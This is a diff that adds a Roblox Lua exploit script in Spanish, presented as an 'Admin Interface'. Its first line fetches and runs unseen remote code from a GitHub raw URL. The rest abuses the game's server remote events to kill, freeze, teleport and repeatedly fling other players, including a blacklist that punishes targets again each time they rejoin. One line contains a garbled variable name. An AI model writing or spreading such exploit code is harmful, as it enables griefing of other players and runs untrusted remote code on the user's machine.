@@ -1,0 +1,404 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Troll-Hub/LonelySC/refs/heads/main/ssc"))()
+
+-- Variables y servicios
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local Workspace = game:GetService("Workspace")
+
+-- Blacklist persistente (en memoria, por UserId)
+local punishBlacklist = {}  -- clave: player.UserId
+
+-------------------------------------------------------------------
+-- Crear UI
+-------------------------------------------------------------------
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- Tamaño de la interfaz
+local mainSize = UDim2.new(0, 150, 0, 155)
+local minimizedSize = UDim2.new(0, 150, 0, 20)
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = mainSize
+MainFrame.Position = UDim2.new(0.5, -75, 0.3, 0)  -- centrado horizontalmente
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.BackgroundTransparency = 0.3
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local uiGradientMain = Instance.new("UIGradient")
+uiGradientMain.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 25)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))
+})
+uiGradientMain.Rotation = 45
+uiGradientMain.Parent = MainFrame
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+-- Crear HEADER (siempre visible)
+local isMinimized = false
+local Header = Instance.new("Frame")
+Header.Name = "Header"
+Header.Size = UDim2.new(1, 0, 0, 20)
+Header.Position = UDim2.new(0, 0, 0, 0)
+Header.BackgroundTransparency = 1
+Header.Parent = MainFrame
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.Size = UDim2.new(0.8, 0, 1, 0)
+TitleLabel.Position = UDim2.new(0, 0, 0, 0)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Text = "Admin Interface"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextScaled = true
+TitleLabel.Font = Enum.Font.GothamSemibold
+TitleLabel.Parent = Header
+
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0.2, 0, 1, 0)
+MinimizeButton.Position = UDim2.new(0.8, 0, 0, 0)
+MinimizeButton.BackgroundTransparency = 0
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.Text = "–"
+MinimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+MinimizeButton.TextScaled = true
+MinimizeButton.Font = Enum.Font.GothamSemibold
+MinimizeButton.Parent = Header
+
+-- Crear ContentFrame (debajo del HEADER)
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Name = "ContentFrame"
+ContentFrame.Size = UDim2.new(1, 0, 1, -20)  -- 150 - 20 = 130 de alto
+ContentFrame.Position = UDim2.new(0, 0, 0, 20)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Parent = MainFrame
+
+-- InputFrame para la barra de selección (20 px de alto)
+local InputFrame = Instance.new("Frame")
+InputFrame.Name = "InputFrame"
+InputFrame.Size = UDim2.new(1, 0, 0, 20)
+InputFrame.Position = UDim2.new(0, 0, 0, 0)
+InputFrame.BackgroundTransparency = 1
+InputFrame.Parent = ContentFrame
+
+local InputBox = Instance.new("TextBox")
+InputBox.Size = UDim2.new(0.9, 0, 0, 16)
+InputBox.Position = UDim2.new(0.05, 0, 0.1, 0)
+InputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+local uiGradientInput = Instance.new("UIGradient")
+uiGradientInput.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))
+})
+uiGradientInput.Rotation = 45
+uiGradientInput.Parent = InputBox
+InputBox.TextColor3 = Color3.fromRGB(0, 255, 0)
+InputBox.TextScaled = true
+InputBox.PlaceholderText = "???"
+InputBox.Parent = InputFrame
+
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 8)
+InputCorner.Parent = InputBox
+
+-- ButtonsFrame para los comandos (resto del ContentFrame)
+local ButtonsFrame = Instance.new("Frame")
+ButtonsFrame.Name = "ButtonsFrame"
+ButtonsFrame.Size = UDim2.new(1, 0, 0, 160)  -- subí 50 px como pediste
+ButtonsFrame.Position = UDim2.new(0, 0, 0, 20)
+ButtonsFrame.BackgroundTransparency = 1
+ButtonsFrame.Parent = ContentFrame
+
+-- UIGridLayout para organizar los botones en 2 columnas
+local grid = Instance.new("UIGridLayout")
+grid.CellSize = UDim2.new(0, 65, 0, 12)
+grid.CellPadding = UDim2.new(0, 2, 0, 2)
+grid.FillDirectionMaxCells = 2
+grid.SortOrder = Enum.SortOrder.LayoutOrder
+grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
+grid.Parent = ButtonsFrame
+
+-------------------------------------------------------------------
+-- Función de minimizar (oculta o muestra ContentFrame)
+-------------------------------------------------------------------
+MinimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    local tweenSize = TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = isMinimized and minimizedSize or mainSize
+    })
+    tweenSize:Play()
+    ContentFrame.Visible = not isMinimized
+    local goalRotation = isMinimized and 180 or 0
+    local tweenRotation = TweenService:Create(MinimizeButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Rotation = goalRotation
+    })
+    tweenRotation:Play()
+    MinimizeButton.Text = isMinimized and "+" or "–"
+end)
+
+-------------------------------------------------------------------
+-- Arrastrar la interfaz usando el Header
+-------------------------------------------------------------------
+local Dragging, DragInput, DragStart, StartPos
+Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+        Dragging = true
+        DragStart = input.Position
+        StartPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                Dragging = false
+            end
+        end)
+    end
+end)
+
+Header.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
+        DragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == DragInput and Dragging then
+        local Delta = input.Position - DragStart
+        if input.UserInputType == Enum.UserInputType.Touch then
+            local newXOffset = StartPos.X.Offset + Delta.X
+            local newYOffset = StartPos.Y.Offset + Delta.Y
+            MainFrame.Position = UDim2.new(StartPos.X.Scale, newXOffset, StartPos.Y.Scale, newYOffset)
+        else
+            local screenSize = workspace.CurrentCamera.ViewportSize
+            local newXOffset = math.clamp(StartPos.X.Offset + Delta.X, 0, screenSize.X - MainFrame.Size.X.Offset)
+            local newYOffset = math.clamp(StartPos.Y.Offset + Delta.Y, 0, screenSize.Y - MainFrame.Size.Y.Offset)
+            MainFrame.Position = UDim2.new(StartPos.X.Scale, newXOffset, StartPos.Y.Scale, newYOffset)
+        end
+    end
+end)
+
+-------------------------------------------------------------------
+-- Función para obtener jugadores (coincidencia flexible)
+-------------------------------------------------------------------
+local function getPlayers(target)
+    local lowerTarget = string.lower(target or "")
+    local matchedPlayers = {}
+    if lowerTarget == "all" then
+        return Players:GetPlayers()
+    elseif lowerTarget == "others" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                table.insert(matchedPlayers, player)
+            end
+        end
+    elseif lowerTarget == "me" then
+        return {LocalPlayer}
+    else
+        for _, player in ipairs(Players:GetPlayers()) do
+            local nameLower = string.lower(player.Name)
+            local displayLower = string.lower(player.DisplayName)
+            if nameLower == lowerTarget or displayLower == lowerTarget
+            or nameLower:find(lowerTarget) or displayLower:find(lowerTarget) then
+                table.insert(matchedPlayers, player)
+            end
+        end
+    end
+    return matchedPlayers
+end
+
+-------------------------------------------------------------------
+-- Función de efecto de partículas en botones
+-------------------------------------------------------------------
+local function spawnParticleEffect(button)
+    for i = 1, 5 do
+        local particle = Instance.new("ImageLabel")
+        particle.Size = UDim2.new(0, 6, 0, 6)
+        particle.Position = UDim2.new(0.5, 0, 0.5, 0)
+        particle.AnchorPoint = Vector2.new(0.5, 0.5)
+        particle.BackgroundTransparency = 1
+        particle.Image = "rbxassetid://2795790"
+        particle.ImageColor3 = Color3.new(math.random(), math.random(), math.random())
+        particle.Parent = button
+        local randomOffset = UDim2.new(0, math.random(-20,20), 0, math.random(-20,20))
+        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = TweenService:Create(particle, tweenInfo, {Position = randomOffset, ImageTransparency = 0})
+        tween:Play()
+        tween.Completed:Connect(function() particle:Destroy() end)
+    end
+end
+
+-------------------------------------------------------------------
+-- Función para ejecutar comandos
+-------------------------------------------------------------------
+local function executeCommand(command)
+    local target = InputBox.Text
+    local targetPlayers = getPlayers(target)
+
+    for _, player in ipairs(targetPlayers) do
+        if command == "bring" then
+            if player.Character then
+                local argsTrue = {true, player.Character, LocalPlayer.Character.PrimaryPart.CFrame}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsTrue))
+                local argsFalse = {falseJugadorr.Character}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsFalse))
+            end
+
+        elseif command == "kill" then
+            if player.Character then
+                local args = {player.Character.Humanoid, 1e111, LocalPlayer}
+                ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(unpack(args))
+            end
+
+        elseif command == "heal" then
+            if player.Character then
+                local args = {player.Character.Humanoid, -1e9, LocalPlayer}
+                ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(unpack(args))
+            end
+
+        elseif command == "freeze" then
+            if player.Character then
+                local argsFreeze = {true, player.Character, player.Character.PrimaryPart.CFrame}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsFreeze))
+            end
+
+        elseif command == "unfreeze" then
+            if player.Character then
+                local argsUnfreeze = {false, player.Character}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsUnfreeze))
+            end
+
+        elseif command == "to" then
+            if player.Character then
+                LocalPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
+            end
+
+        elseif command == "b1" then
+            local object = Workspace:FindFirstChild("Map") and Workspace.Map.DBS.DB:FindFirstChild("DB1")
+            if object and player.Character then
+                local argsTrue = {true, player.Character, object.CFrame}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsTrue))
+                local argsFalse = {false, player.Character}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsFalse))
+            end
+
+        elseif command == "permGod" then
+            if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                local healArgs = {player.Character.Humanoid, -1e111, LocalPlayer}
+                ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(unpack(healArgs))
+                local killArgs = {player.Character.Humanoid, 1e111, LocalPlayer}
+                ReplicatedStorage._BindableEvents.Moves.TakeDamage:FireServer(unpack(killArgs))
+            end
+
+        elseif command == "Killer" then
+            if player.Character then
+                local userId = player.UserId
+                local argsPunish = {true, player.Character, CFrame.new(math.huge, math.huge, math.huge)}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsPunish))
+                local argsUnfreeze = {false, player.Character}
+                ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsUnfreeze))
+                punishBlacklist[userId] = true
+            end
+
+        elseif command == "T objetive" then
+            -- T objetive con contador leve y limpieza al finalizar
+            local targetName = InputBox.Text or ""
+            local lowerTarget = string.lower(targetName)
+            local alreadyExecuted = {}
+
+            local function runForPlayer(p)
+                if (lowerTarget == "others" or lowerTarget == "all") then
+                    if alreadyExecuted[p.UserId] then return end
+                    alreadyExecuted[p.UserId] = true
+                end
+
+                if p and p.Character and p.Status then
+                    local args = {
+                        [1] = {
+                            ["Humanoid"] = p.Character:FindFirstChild("Humanoid"),
+                            ["Head"] = p.Character:FindFirstChild("Head"),
+                            ["UpperTorso"] = p.Character:FindFirstChild("UpperTorso"),
+                            ["HumanoidRootPart"] = p.Character:FindFirstChild("HumanoidRootPart"),
+                            ["Character"] = p.Character
+                        },
+                        [2] = LocalPlayer.Status and LocalPlayer.Status.Mode,
+                        [3] = p.Status and p.Status.ModeActive,
+                        [4] = p.Status,
+                        [5] = false
+                    }
+
+                    ReplicatedStorage._BindableEvents.Transform:InvokeServer(unpack(args))
+                end
+            end
+
+            if lowerTarget == "all" or lowerTarget == "others" then
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p ~= LocalPlayer then
+                        runForPlayer(p)
+                    end
+                end
+            else
+                -- usar la misma detección flexible que getPlayers
+                local matched = getPlayers(targetName)
+                for _, p in ipairs(matched) do
+                    runForPlayer(p)
+                end
+            end
+
+            -- Limpiar registro para permitir ejecuciones futuras
+            alreadyExecuted = nil
+        end
+    end
+end
+
+-------------------------------------------------------------------
+-- Reaplicar punish a jugadores en blacklist al unirse
+-------------------------------------------------------------------
+Players.PlayerAdded:Connect(function(player)
+    if punishBlacklist[player.UserId] then
+        player.CharacterAdded:Connect(function(character)
+            spawn(function()
+                while player.Parent and punishBlacklist[player.UserId] do
+                    local argsPunish = {true, character, CFrame.new(math.huge, math.huge, math.huge)}
+                    ReplicatedStorage._BindableEvents.Moves.StopEnemy:FireServer(unpack(argsPunish))
+                    wait(0.1)
+                end
+            end)
+        end)
+    end
+end)
+
+-------------------------------------------------------------------
+-- Crear botones (todos los comandos)
+-------------------------------------------------------------------
+local commands = {"kill", "heal", "permGod", "freeze", "unfreeze", "bring", "to", "b1", "T objetive"}
+for _, cmd in ipairs(commands) do
+    local button = Instance.new("TextButton")
+    button.BackgroundColor3 = Color3.fromRGB(230,230,230)
+    local uiGradientButton = Instance.new("UIGradient")
+    uiGradientButton.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(240,240,240)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(210,210,210))
+    })
+    uiGradientButton.Rotation = 45
+    uiGradientButton.Parent = button
+    button.TextColor3 = Color3.fromRGB(0,0,0)
+    button.TextScaled = true
+    button.Text = cmd:upper()
+    button.Parent = ButtonsFrame
+    local corner = Instance.new("UICorner", button)
+    corner.CornerRadius = UDim.new(0,6)
+    button.MouseButton1Click:Connect(function()
+        spawnParticleEffect(button)
+        executeCommand(cmd)
+        StarterGui:SetCore("SendNotification", {
+            Title="Admin",
+            Text="Comando ejecutado: "..cmd:upper(),
+            Duration=0.1
+        })
+    end)
+end
